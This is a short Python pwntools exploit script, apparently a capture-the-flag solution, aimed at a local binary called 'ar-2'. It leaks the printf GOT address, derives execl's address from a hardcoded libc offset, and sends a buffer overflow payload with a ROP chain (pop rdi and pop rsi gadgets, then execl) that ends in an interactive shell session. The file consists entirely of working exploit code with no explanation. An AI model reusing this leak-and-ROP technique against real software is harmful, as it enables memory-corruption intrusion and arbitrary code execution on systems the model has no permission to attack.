#!/usr/bin/env python

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
p = process('./ar-2')
#p = process('./ar-x')
#gdb.attach(p, "b *main")

print(p.recv())

got_printf = p.elf.got['printf']

p.sendline("60")
print(p.recv())
p.sendline(hex(got_printf))
p.recvline()

#i=0
#while i < 100:
#    data = u64(p.recvn(8))
#    print(hex(data))
#    i++

addr = u64(p.recvn(8))
p.recv()

#print(hex(addr))

# $1 = {<text variable, no debug info>} 0x7f1548af9a20 <__GI_execl>
# 0x7f1548a82800

offset = 0x7f1548af9a20 - 0x7f1548a82800
addr_execl = addr + offset

# 0x0000000000400a33 : pop rdi ; ret
# 0x0000000000400a31 : pop rsi ; pop r15 ; ret

pop_rdi = p64(0x400a33)
pop_rsi_r15 = p64(0x400a31)
prog_name = p64(0x400012)

buf = "A"*0x88 + pop_rdi + prog_name + pop_rsi_r15 + p64(0) + p64(0) + p64(addr_execl)

p.sendline(buf)
p.interactive()

#exit()
